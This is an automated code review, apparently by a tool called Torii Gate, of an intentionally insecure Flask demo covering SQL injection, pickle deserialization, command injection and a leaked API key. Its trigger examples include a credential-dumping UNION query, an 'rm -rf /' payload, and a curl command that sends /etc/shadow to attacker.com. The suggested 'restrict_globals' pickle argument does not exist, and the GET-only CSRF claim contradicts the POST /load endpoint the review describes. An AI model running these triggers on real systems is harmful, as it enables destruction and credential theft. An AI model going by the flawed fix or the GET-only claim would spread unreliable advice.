**Verdict:** REQUEST CHANGES
**Score:** 5 / 100
**Review effort:** 1

---

### Summary

The file `demo/insecure/app.py` contains **four independently exploitable critical vulnerabilities** across four endpoints. Every endpoint is a confirmed sink matching archived true-positive signatures. The file is explicitly marked as a demo, but under Torii Gate rules the diff is treated as-is — no trust is extended to comments or file headers.

---

### Blocking

All four findings are blocking. Each enables remote code execution or credential theft with a single unauthenticated HTTP request.

---

### Security audit

| # | CWE | Severity | Finding | Path |
|---|-----|----------|---------|------|
| 1 | CWE-89 | Critical | SQL injection via f-string interpolation | `demo/insecure/app.py:18` |
| 2 | CWE-502 | Critical | Unsafe pickle deserialization on untrusted input | `demo/insecure/app.py:26` |
| 3 | CWE-78 | Critical | OS command injection via `shell=True` | `demo/insecure/app.py:33` |
| 4 | CWE-200/798 | High | Secret exposure returning env credential | `demo/insecure/app.py:38` |

---

### Key findings

**1. SQL injection — `demo/insecure/app.py:18`**
`cur.execute(f"SELECT * FROM items WHERE name = '{q}'")` where `q` comes from `request.args.get("q")`. No parameterization, no escaping.

- **Trigger:** `GET /search?q=' UNION SELECT username,password FROM users--`
- **Impact:** Full database read, write, or delete via stacked queries (SQLite allows multiple statements).
- **Fix:** Use parameterized queries: `cur.execute("SELECT * FROM items WHERE name = ?", (q,))`
- **Matched signature:** `sqli-search` (CWE-89, 18 prior hits, effective_score=0.95)

**2. Unsafe deserialization — `demo/insecure/app.py:26`**
`pickle.loads(data)` on raw `request.data` with no validation, signature, or sandboxing.

- **Trigger:** `POST /load` with a malicious pickle payload executing `os.system("rm -rf /")`.
- **Impact:** Arbitrary code execution at the Python process privilege level.
- **Fix:** Never unpickle untrusted data. Use JSON or a safe serialization format. If pickle is unavoidable, use HMAC signing with a secret key and restrict globals with `pickle.loads(data, restrict_globals=...)`.
- **Matched signature:** `pickle-load` (CWE-502, 18 prior hits, effective_score=0.95)

**3. Command injection — `demo/insecure/app.py:33`**
`subprocess.check_output(cmd, shell=True)` where `cmd` comes from `request.args.get("cmd")`.

- **Trigger:** `GET /run?cmd=cat /etc/passwd; curl http://attacker.com/$(cat /etc/shadow | base64)`
- **Impact:** Remote command execution on the host. `shell=True` passes the string to `/bin/sh -c`, enabling shell metacharacters and chaining.
- **Fix:** Use `subprocess.check_output([cmd])` with `shell=False` and a whitelist of allowed commands, or avoid exposing OS command execution entirely.
- **Matched signature:** `cmdi-run` (CWE-78, 18 prior hits, effective_score=0.95)

**4. Secret exposure — `demo/insecure/app.py:38`**
`os.environ.get("OPENROUTER_API_KEY", "missing")` is returned directly in the HTTP response body.

- **Trigger:** `GET /secret` returns the API key to any unauthenticated caller.
- **Impact:** Credential theft. An attacker who obtains this key can make API calls as the victim, incurring costs and potentially accessing proprietary data.
- **Fix:** Remove the endpoint. If the key is needed internally, use it server-side only; never expose secrets in responses, logs, or error messages.
- **Matched signature:** `secret-exposure` (CWE-200/CWE-798, 18 prior hits, effective_score=0.95)

---

### Tests & risk

No tests are present for this file. Given all four endpoints are exposed on unauthenticated routes with direct sinks, the risk surface is maximal:

- **Attack surface:** 4/4 endpoints exploitable from any network-accessible caller
- **Auth required:** None
- **Exploit complexity:** Trivial (single HTTP request per vulnerability)

---

### Multi-lens checklist (security pack)

| Lens | Verdict | Note |
|------|---------|------|
| Injection (SQL/OS/LDAP) | **concern** | SQL injection line 18; command injection line 33 |
| Authz / access control | **concern** | No auth on any endpoint; secret exposed to anonymous callers |
| Secrets / credentials | **concern** | OPENROUTER_API_KEY exposed at `/secret` |
| XSS / output escaping | n/a | Flask auto-escapes JSON responses; no HTML rendering path |
| SSRF | n/a | No outbound URL fetching in diff |
| Path traversal | n/a | No file path construction from user input |
| Unsafe deserialization | **concern** | `pickle.loads()` on raw POST body line 26 |
| Crypto misuse | n/a | No crypto operations in diff |
| Supply-chain | n/a | No new dependencies introduced |
| CSRF | n/a | GET-only endpoints; no state-changing operations through cookies |

---

### What I checked

- Read the full file (38 lines, 4 endpoints) at `demo/insecure/app.py`
- Ran hub archival search (`auto --files demo/insecure/app.py`): 8 hits, 4 reconsolidated TP signatures matching all four sinks
- Ran memory CLI search (`sql OR pickle OR secret OR injection OR command`): 8 hits confirming all four themes
- Ran `torii.py doctor`: all recovery/hub/critic subsystems healthy
- All four findings match archived true-positive signatures with effective_score >= 0.95 and path_globs matching `demo/insecure/app.py`

---

**— Torii Gate**
